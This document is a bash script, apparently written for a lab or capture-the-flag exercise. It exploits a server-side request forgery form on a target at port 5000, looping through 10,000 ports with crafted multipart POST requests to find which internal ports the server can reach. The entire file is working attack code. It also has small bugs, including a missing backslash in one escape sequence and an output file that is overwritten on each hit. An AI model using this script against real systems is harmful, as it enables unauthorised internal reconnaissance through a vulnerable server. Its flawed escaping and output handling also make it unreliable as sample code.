#!/usr/bin/env bash
# This takes forever, because I was testing this on the port 5000 ssrf login, it will time you out
# if you try to go faster. Just a fun side exersize I wanted to test.

for i in {1..10000}
do
echo "Trying port: ${i}"
    if (curl -i -s -k -X $'POST' \
        -H $'Host: 10.10.106.111:5000' \
        -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' \
        -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
        -H $'Accept-Language: en-US,en;q=0.5' \
        -H $'Accept-Encoding: gzip, deflate' \
        -H $'Referer: http://10.10.106.111:5000/exists' \
        -H $'Content-Type: multipart/form-data; boundary=---------------------------2238991916360315331947945693' \
        -H $'Content-Length: 187' \
        -H $'Connection: close' \
        -H $'Upgrade-Insecure-Requests: 1' \
        --data-binary $'-----------------------------2238991916360315331947945693\x0d\x0a''Content-Disposition: form-data; name="url"'$'x0d\x0a\x0d\x0a'"http://0.0.0.0:${i}"$'\x0d\x0a-----------------------------2238991916360315331947945693--\x0d\x0a' \
        'http://10.10.106.111:5000/exists'  | grep -q "Target is reachable"); then
        echo "${i}" | tee ports.txt
    fi
# The server takes a poop if you don't give it a breath between requests
sleep 1
done

